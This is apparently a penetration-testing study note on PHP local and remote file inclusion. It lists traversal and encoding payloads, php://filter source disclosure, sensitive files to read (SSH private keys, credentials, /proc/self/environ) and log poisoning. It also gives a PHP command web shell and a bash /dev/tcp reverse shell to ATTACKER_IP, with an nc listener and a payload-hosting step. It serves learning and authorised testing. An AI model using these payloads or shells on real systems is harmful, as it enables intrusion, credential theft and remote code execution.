# File Inclusion (LFI / RFI)

The application decides which file to load based on something you control. A `?page=about` parameter, a template name, a language file, a theme — anywhere a filename is assembled from input. Two outcomes sit behind the same bug: **[[Security-Terms#^lfi|LFI]]** reads files that already exist on the target, and **[[Security-Terms#^rfi|RFI]]** makes the target fetch and execute a file from a server you own.

The parameter names that give it away: `page`, `file`, `template`, `include`, `lang`, `view`, `doc`, `path`, `dir`. If a value looks like it becomes part of a path, this is the note.

## Prove the parameter reaches the filesystem

```text
page=../../../../../../../../etc/passwd
page=../../../../../../../../windows/system32/drivers/etc/hosts
page=....//....//....//....//etc/passwd
page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
page=/etc/passwd
```

- eight or more `../` → you do not know how deep the include path starts, and traversal past the filesystem root is harmless: `/` has no parent, so extra pairs are simply ignored. Using three and getting nothing is indistinguishable from not being vulnerable
- `/etc/passwd` with no traversal at all → tries the absolute-path case, where the application concatenates nothing in front of your value. One extra request, and it is occasionally the only one that works
- `....//` → defeats a filter that strips the literal string `../` **once**, non-recursively: removing the inner `../` from `....//` leaves `../` behind. The same idea as the nested-word trick in [[XSS]]
- `%2e%2e%2f` → URL-encoded traversal, for a filter that runs before decoding. Double encoding (`%252e%252e%252f`) covers the case where the value is decoded twice on its way in
- `/etc/passwd` and `windows/.../hosts` → pick the probe file by target OS; a Linux payload against IIS returns nothing and proves nothing

## When an extension is being appended

```text
page=../../../../etc/passwd%00
page=../../../../etc/passwd.
page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
page=php://filter/convert.base64-encode/resource=index
```

- `%00` → null-byte truncation: the C string ends there and the appended `.php` never arrives. **Fixed in PHP 5.3.4, in 2010.** On anything modern this burns time for nothing, so try it once and move on rather than cycling variants of it
- trailing `.` or `/.` → path normalisation quirks that occasionally strip the suffix. Cheap to test, rarely works
- `php://filter/convert.base64-encode/resource=` → **the one that actually works**, and the most valuable payload in this note. The wrapper reads the file through a stream filter instead of including it, so PHP source comes back base64 encoded rather than being executed. It also survives the appended extension when you drop the extension from your own value (`resource=index` becomes `index.php`)
- decode locally: `base64 -d`. The output is server-side source, which is where the credentials, the database connection and the next vulnerability live

## Files worth reading once you have read

```text
/etc/passwd                          usernames and shells
/etc/hosts                           other names this host knows
/proc/self/environ                   the web server's environment, sometimes credentials
/proc/self/cmdline                   how the server process was started
/var/log/apache2/access.log          the log-poisoning route to execution
/var/www/html/config.php             application credentials
/home/<user>/.ssh/id_rsa             a private key is a shell
/etc/apache2/sites-enabled/000-default.conf   the real document root and other vhosts
```

- `/proc/self/environ` → readable only as the process owner, and on many systems only when the reading process *is* the web server, which here it is. Worth trying early
- application config → you need the document root first, which the Apache config above gives you. Guessing `/var/www/html/` works often enough to try, but reading the config is the reliable way
- private keys → `id_rsa` is worth more than any password. Check `/home/*/` for each username `/etc/passwd` gave you
- log files → the bridge from read to execution: if you can write a PHP tag into a log the server later includes, it runs. The `User-Agent` header is the usual write channel

## Remote File Inclusion — execution from your own server

```php
<?php system($_GET["cmd"]); ?>
```

- a command web shell — anything passed as `?cmd=` runs and its output is printed
- requires **both** `allow_url_fopen` **and** `allow_url_include` to be `On`. `fopen` alone lets PHP *read* a remote URL; `include` is what lets it *execute* one. `allow_url_include` is `INI_SYSTEM` and defaults to `Off`, so finding it enabled is a deliberate misconfiguration, not drift
- deprecated as of **PHP 7.4.0**. It still exists in PHP 8 and emits a deprecation notice, and the manual lists no removal version — so RFI is *rare* on modern targets, not impossible. Do not write it off on version alone; check the directive itself via `phpinfo()` or a config leak
- unlike LFI, this executes a file that was never on the target — that is the whole difference

For a full reverse shell, the payload must be called from inside PHP:

```php
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1'"); ?>
```

- the file is run through the PHP interpreter, so a raw `.sh` script will not execute. The shell command has to sit inside `system()` (or `shell_exec`, `exec`, `passthru`)
- `bash -c '...'` → runs the reverse-shell string as a bash command
- `bash -i >& /dev/tcp/ATTACKER_IP/1337 0>&1` → interactive bash piped over TCP; other languages in [[Shells]]
- start the listener **first**: `nc -lvnp 1337`. A shell that connects to nothing is a shell you do not get, and the request will simply appear to hang or fail

Host the payload from the directory it sits in, then trigger the include:

```bash
python3 -m http.server 80
```

```text
file=http://ATTACKER_IP/shell.php
```

- a full URL, not a filesystem path. The path is relative to your HTTP server's **root**, not to the file's location on your disk — `http://IP/shell.php`, never `http://IP/home/user/shell.php`
- add `:port` when the server is not on 80, and remember port 80 needs root locally
- name it `.php`, not `.sh`. **The most common single mistake in this section**
